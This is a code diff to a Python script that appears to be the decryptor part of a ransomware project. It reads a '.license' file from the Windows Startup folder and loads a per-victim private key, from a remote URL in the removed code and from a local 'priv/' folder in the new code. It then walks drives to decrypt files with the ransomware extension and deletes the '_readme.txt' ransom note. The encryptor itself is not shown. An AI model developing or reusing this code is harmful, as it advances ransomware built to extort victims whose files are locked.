@@ -17,15 +17,24 @@ def gext(filename):
     return ext
 
 def gl(filename):
-    # On Website
     try:
-        url_web = "YOUR URL"
+        # On Website
+        # url_web = "YOUR URL"
+        # with open(filename,'r') as license:
+        #     ler = license.read()
+        #     l = ler.split('.')[0]
+        # URL_KEY = url_web + l + '.pem'
+        # pvk = req.get(URL_KEY).text
+        # return pvk
+    
+        # On Local (Tested)
+        url_web = "priv/"
         with open(filename,'r') as license:
             ler = license.read()
             l = ler.split('.')[0]
         URL_KEY = url_web + l + '.pem'
-        pvk = req.get(URL_KEY).text
-        return pvk
+        priv = open(URL_KEY).read()
+        return priv
     except:
         print("Please use internet connection")
 
@@ -44,11 +53,9 @@ def decrypt(filename,pvk):
         file.write(data)
 
 
-def defense(target,log):
+def defense(target,ext,pvk):
     for p, d, f in os.walk(target):
         for name in f:
-            ext = gext(log+sp()+'.license')
-            pvk = gl(log+sp()+'.license')
             if name.endswith((ext)):
                 try:
                     decrypt(os.path.join(p, name),pvk)
@@ -56,17 +63,20 @@ def defense(target,log):
                     os.rename(os.path.join(p, name), os.path.join(p,newFile))
                 except:
                     continue
-                try:
-                    os.remove(log+sp()+"_readme.txt")
-                except:
-                    status = "All Files has been Decrypted"
 
 if __name__ == '__main__':
     if (platform == 'win32'):
-        t = [os.environ["USERPROFILE"],"A:","B:","D:","E:","F:","G:","H:","I:","J:","K:","L:","M:","N:","M:","O:","P:","Q:","R:","S:","T:","U:","V:","W:","X:","Y:","Z:"]
-        jlog = [os.environ["PROGRAMDATA"]+sp()+'Microsoft'+sp()+'Windows'+sp()+'Start Menu'+sp()+'Programs'+sp()+'StartUp']
+        t = ['I:']
+        jlog = os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
+        ext = gext(jlog+sp()+'.license')
+        pvk = gl(jlog+sp()+'.license')
+
         for i in range(len(t)):
-            defense(t[i] + sp(),jlog)
+            defense(t[i] + sp(),ext,pvk)
+            try:
+                os.remove(jlog+sp()+"_readme.txt")
+            except:
+                status = "All Files has been Decrypted"
     elif (platform == 'linux'):
         t = [os.environ["HOME"]]
         for i in range(len(t)):
